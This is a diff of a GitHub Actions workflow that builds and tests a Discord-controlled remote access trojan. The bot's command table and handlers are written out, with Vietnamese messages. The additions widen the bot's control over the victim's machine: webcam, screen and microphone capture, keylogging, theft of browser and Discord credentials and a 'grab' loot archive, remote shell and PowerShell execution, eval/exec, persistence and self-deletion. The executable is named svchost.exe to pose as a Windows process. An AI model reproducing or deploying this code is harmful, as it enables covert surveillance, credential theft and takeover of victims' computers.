+          async def c_notify(m, a):  await m.channel.send(await ex(f_notify, " ".join(a)))
           async def c_wall(m, a):    await m.channel.send(await ex(f_wall, " ".join(a)))
+          async def c_open(m, a):    await m.channel.send(await ex(f_open, " ".join(a)))
+          async def c_play(m, a):    await m.channel.send(await ex(f_play, " ".join(a)))
 
           async def c_chupanh(m, a):
               await m.channel.send("📷 ..."); p = await ex(f_cam)
               await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌ Không chụp được")
-
           async def c_chupmanhinh(m, a):
               await m.channel.send("🖼️ ..."); p = await ex(f_screen)
               await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌ Không chụp được")
-
           async def c_monitors(m, a):
               ps = await ex(f_monitors)
               if not ps: return await m.channel.send("❌ Không chụp được")
               for p in ps: await m.channel.send(file=discord.File(p))
-
           async def c_record(m, a):
               await m.channel.send("🎬 ..."); p = await ex(f_record, a[0] if a else 10)
               await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌ Thiếu mss/opencv")
-
           async def c_camgif(m, a):
               await m.channel.send("📷 ..."); p = await ex(f_camgif)
               await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌ Không chụp được")
-
           async def c_mic(m, a):
               await m.channel.send("🎤 ..."); p = await ex(f_mic, a[0] if a else 5)
               await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌ Thiếu sounddevice")
-
           async def c_speak(m, a):   await m.channel.send(await ex(f_speak, " ".join(a)))
           async def c_beep(m, a):    await m.channel.send(await ex(f_beep))
+
           async def c_keylog(m, a):  await send_long(m, await ex(f_keylog, a[0] if a else "dump"))
           async def c_type(m, a):    await m.channel.send(await ex(f_type, " ".join(a)))
           async def c_mouse(m, a):   await m.channel.send(await ex(f_mouse, a))
+          async def c_caps(m, a):    await m.channel.send(await ex(f_caps))
+          async def c_desk(m, a):    await m.channel.send(await ex(f_desk))
+          async def c_mute(m, a):    await m.channel.send(await ex(f_mute))
+          async def c_volup(m, a):   await m.channel.send(await ex(f_volup, a[0] if a else 5))
+          async def c_voldown(m, a): await m.channel.send(await ex(f_voldown, a[0] if a else 5))
+
           async def c_wifi(m, a):    await send_long(m, await ex(f_wifi))
           async def c_net(m, a):     await send_long(m, await ex(f_net))
           async def c_ports(m, a):   await send_long(m, await ex(f_ports))
           async def c_ping(m, a):    await send_long(m, await ex(f_ping, " ".join(a) or "8.8.8.8"))
+          async def c_arp(m, a):     await send_long(m, await ex(f_arp))
+          async def c_dns(m, a):     await m.channel.send(await ex(f_dns))
+          async def c_dl(m, a):      await m.channel.send(await ex(f_dl, a))
+          async def c_speedtest(m, a):await m.channel.send(await ex(f_speedtest))
+
           async def c_cd(m, a):      await m.channel.send(await ex(f_cd))
           async def c_flip(m, a):    await m.channel.send(await ex(f_flip))
           async def c_volume(m, a):  await m.channel.send(await ex(f_volume, a))
           async def c_bsod(m, a):    await m.channel.send("💥 BSOD...")
           async def c_id(m, a):      await m.channel.send(f"🆔 `{MACHINE_ID}`")
           async def c_persist(m, a): await ex(install); await m.channel.send("✅ Đã cài lại persist")
+          async def c_restart(m, a): await m.channel.send("♻️ Đang khởi động lại..."); await ex(f_restart)
+
+          async def c_grab(m, a):
+              await m.channel.send("📦 Đang gom loot..."); p = await ex(f_grab)
+              await m.channel.send(file=discord.File(p, filename=f"grab_{MACHINE_ID}.zip"))
+          async def c_browser(m, a): await send_long(m, await ex(f_browser))
+          async def c_discord(m, a): await send_long(m, await ex(f_discord))
 
           async def c_download(m, a):
               path = os.path.expanduser(" ".join(a))
@@ -638,20 +1045,23 @@ jobs:
                   p = await ex(f_zip, path)
                   return await m.channel.send(file=discord.File(p, filename="folder.zip"))
               await m.channel.send(file=discord.File(path))
-
           async def c_zip(m, a):
               p = await ex(f_zip, " ".join(a) or ".")
               await m.channel.send(file=discord.File(p, filename="dump.zip"))
-
           async def c_upload(m, a):
               if not m.attachments: return await m.channel.send("❌ Kèm file vào tin nhắn")
               for at in m.attachments:
                   await at.save(os.path.join(LOOT_DIR, at.filename))
               await m.channel.send(f"✅ Đã nhận {len(m.attachments)} file → {LOOT_DIR}")
-
           async def c_update(m, a):
-              await m.channel.send("🔄 Đang cập nhật...")
-              await ex(f_update, " ".join(a))
+              await m.channel.send("🔄 Đang cập nhật..."); await ex(f_update, " ".join(a))
+
+          async def c_eval(m, a):
+              raw = getattr(m, "_raw", " ".join(a))
+              await send_long(m, await ex(f_eval, raw))
+          async def c_exec(m, a):
+              raw = getattr(m, "_raw", " ".join(a))
+              await send_long(m, await ex(f_exec, raw))
 
           async def c_join(m, a):
               global _vc, _src
@@ -667,7 +1077,6 @@ jobs:
               _src = StreamSource(kind)
               _vc.play(_src)
               await m.channel.send(f"🔊 Vào `{ch.name}` — phát **{kind}**")
-
           async def c_leave(m, a):
               global _vc, _src
               if _src: _src.running = False
@@ -679,20 +1088,32 @@ jobs:
               await m.channel.send("💥 Tự hủy...")
               await ex(uninstall); time.sleep(0.5)
               subprocess.Popen(
-                  f'cmd /c ping 1.1.1.1 -n 3 > nul & rmdir /s /q "{INSTALL_DIR}"', shell=True)
+                  f'cmd /c ping 1.1.1.1 -n 3 > nul & rmdir /s /q "{INSTALL_DIR}"',
+                  shell=True, creationflags=NO_WIN)
               os._exit(0)
 
           COMMANDS = {
-              "help":c_help,"cmd":c_cmd,"ls":c_ls,"search":c_search,"del":c_del,
-              "sysinfo":c_sysinfo,"ps":c_ps,"kill":c_kill,"start":c_start,"power":c_power,
-              "clip":c_clip,"msg":c_msg,"wall":c_wall,
-              "chupanh":c_chupanh,"chupmanhinh":c_chupmanhinh,"monitors":c_monitors,
+              "help":c_help,"cmd":c_cmd,"sh":c_sh,"shell":c_sh,"ps1":c_ps1,"powershell":c_ps1,
+              "pwd":c_pwd,"cddir":c_cddir,
+              "ls":c_ls,"cat":c_cat,"write":c_write,"mkdir":c_mkdir,"copy":c_copy,"move":c_move,
+              "rename":c_rename,"tree":c_tree,"du":c_du,"hex":c_hex,"search":c_search,"find":c_search,
+              "del":c_del,
+              "sysinfo":c_sysinfo,"ps":c_ps,"tasklist":c_ps,"kill":c_kill,"start":c_start,
+              "power":c_power,"drives":c_drives,"env":c_env,"users":c_users,"services":c_services,
+              "startup":c_startup,"schedule":c_schedule,"uptime":c_uptime,"battery":c_battery,
+              "gpu":c_gpu,"av":c_av,"installed":c_installed,"recycle":c_recycle,
+              "clip":c_clip,"msg":c_msg,"notify":c_notify,"wall":c_wall,"open":c_open,"play":c_play,
+              "chupanh":c_chupanh,"chupmanhinh":c_chupmanhinh,"sc":c_chupmanhinh,"monitors":c_monitors,
               "record":c_record,"camgif":c_camgif,"mic":c_mic,"speak":c_speak,"beep":c_beep,
-              "keylog":c_keylog,"type":c_type,"mouse":c_mouse,
-              "wifi":c_wifi,"net":c_net,"ports":c_ports,"ping":c_ping,
-              "cd":c_cd,"flip":c_flip,"volume":c_volume,"bsod":c_bsod,
-              "update":c_update,"persist":c_persist,"id":c_id,"huy":c_huy,
+              "keylog":c_keylog,"type":c_type,"mouse":c_mouse,"caps":c_caps,"desk":c_desk,
+              "mute":c_mute,"volup":c_volup,"voldown":c_voldown,
+              "wifi":c_wifi,"net":c_net,"ip":c_net,"ports":c_ports,"ping":c_ping,"arp":c_arp,
+              "dns":c_dns,"dl":c_dl,"wget":c_dl,"speedtest":c_speedtest,
+              "cd":c_cd,"cdrom":c_cd,"flip":c_flip,"volume":c_volume,"bsod":c_bsod,
+              "grab":c_grab,"browser":c_browser,"discord":c_discord,
+              "update":c_update,"restart":c_restart,"persist":c_persist,"id":c_id,"huy":c_huy,
               "download":c_download,"zip":c_zip,"upload":c_upload,
+              "eval":c_eval,"exec":c_exec,
               "join":c_join,"leave":c_leave,
           }
 
@@ -707,20 +1128,22 @@ jobs:
               if not content.startswith(PREFIX): return
               content = content[len(PREFIX):].strip()
               if not content: return
-              parts = content.split(); name = parts[0].lower(); args = parts[1:]
 
-              if name == "all":
-                  if not args: return
-                  name, args = args[0].lower(), args[1:]
-              elif name == MACHINE_ID.lower():
-                  if not args: return
-                  name, args = args[0].lower(), args[1:]
-              elif name not in COMMANDS:
-                  return
+              tokens = content.split(None, 1)
+              first = tokens[0].lower()
+              if first == "all" or first == MACHINE_ID.lower():
+                  rest = tokens[1] if len(tokens) > 1 else ""
+                  t2 = rest.split(None, 1)
+                  name = t2[0].lower() if t2 else ""
+                  raw = t2[1] if len(t2) > 1 else ""
+              else:
+                  name = first
+                  raw = tokens[1] if len(tokens) > 1 else ""
 
-              fn = COMMANDS.get(name)
-              if not fn: return
-              try: await fn(message, args)
+              if not name or name not in COMMANDS: return
+              setattr(message, "_raw", raw)
+              args = raw.split()
+              try: await COMMANDS[name](message, args)
               except Exception as e:
                   await message.channel.send(f"⚠️ Lỗi `{name}`: {e}")
 
@@ -742,7 +1165,7 @@ jobs:
       - name: Cài thư viện Python
         run: |
           python -m pip install --upgrade pip
-          pip install "discord.py[voice]" PyNaCl psutil pyautogui pyperclip pynput mss opencv-python pillow numpy sounddevice soundfile soundcard requests pyinstaller
+          pip install "discord.py[voice]" PyNaCl psutil pyautogui pyperclip pynput mss opencv-python pillow numpy sounddevice soundfile soundcard requests pycryptodome pyinstaller
 
       - name: Tải libopus-0.dll
         shell: pwsh
@@ -793,7 +1216,7 @@ jobs:
           RUN_MIN: ${{ github.event.inputs.run_minutes }}
         run: |
           Write-Host "=== BẮT ĐẦU TEST — vào Discord nhắn lệnh ==="
-          Write-Host "Thử: !id   !sysinfo   !cmd whoami   !ls C:\   !chupmanhinh"
+          Write-Host "Thử: !id   !sysinfo   !sh whoami   !ls C:\   !grab   !sh chcp"
           $p = Start-Process -FilePath "dist\svchost.exe" -PassThru
           Write-Host "PID $($p.Id) — chạy $env:RUN_MIN phút"
           $secs = [int]$env:RUN_MIN * 60
